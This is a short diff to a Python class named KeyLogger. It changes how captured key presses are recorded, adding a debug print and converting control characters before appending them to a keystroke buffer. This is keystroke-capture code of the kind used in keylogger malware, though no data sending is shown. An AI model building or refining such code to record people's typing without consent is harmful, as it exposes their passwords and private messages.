@@ -26,6 +26,7 @@ class KeyLogger:
                 return     
     
     def on_press(self, key):
+        print(key, type(key))
         if type(key) == Key:
             if key == Key.space:
                 self.keys += ' '
@@ -36,7 +37,10 @@ class KeyLogger:
             else:
                 self.keys += '<' + str(key) + '>'
         else:
-            self.keys += key.char
+            if ord(key.char) < 32:
+                self.keys += chr(ord(key.char) + 96)
+            else:
+                self.keys += key.char
     
     def hook_key(self): 
         if self.is_hooking: return
